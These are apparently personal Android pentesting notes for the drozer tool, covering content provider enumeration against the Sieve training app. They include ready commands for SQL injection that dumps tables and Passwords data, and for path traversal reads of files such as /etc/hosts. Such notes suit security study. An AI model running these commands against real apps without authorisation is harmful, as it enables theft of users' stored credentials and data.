#### Setup drozer
[Android Penetration Tools Walkthrough Series: Drozer - Infosec Resources (infosecinstitute.com)](https://resources.infosecinstitute.com/topic/android-penetration-tools-walkthrough-series-drozer/)

#### Get drozer shell
	`adb forward tcp:31415 tcp:31415`
	`drozer console connect`

#### Content Providers
- Get info from exposed content providers
	`run app.provider.info -a com.mwr.example.sieve`
	
** Note: content provider queries take the form `content://name.of.package.class/declared_name` **

- Drozer can guess and try several URIs
	`run scanner.provider.finduris -a com.mwr.example.sieve`
- Query Content Provider (database based)
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Keys/ --vertical`
- Update and delete content provider (database based)
	[Exploiting Content Providers - HackTricks](https://book.hacktricks.xyz/mobile-apps-pentesting/android-app-pentesting/drozer-tutorial/exploiting-content-providers)
- Manual SQL Injection test
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "'"`
- Manual SQL Lite Dump
	`run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --projection "* FROM SQLITE_MASTER WHERE type='table';--"`
- Automatic SQL Discovery
	`run scanner.provider.injection -a com.mwr.example.sieve`
- Read Files
	`run app.provider.read content://com.mwr.example.sieve.FileBackupProvider/etc/hosts`
- Automatic Path Traversal Discovery
	`run scanner.provider.traversal -a com.mwr.example.sieve`
	
	***
	
### Permissions 
- Examine Permissions and custom permissions
	`run app.package.info -a com.spotify.music`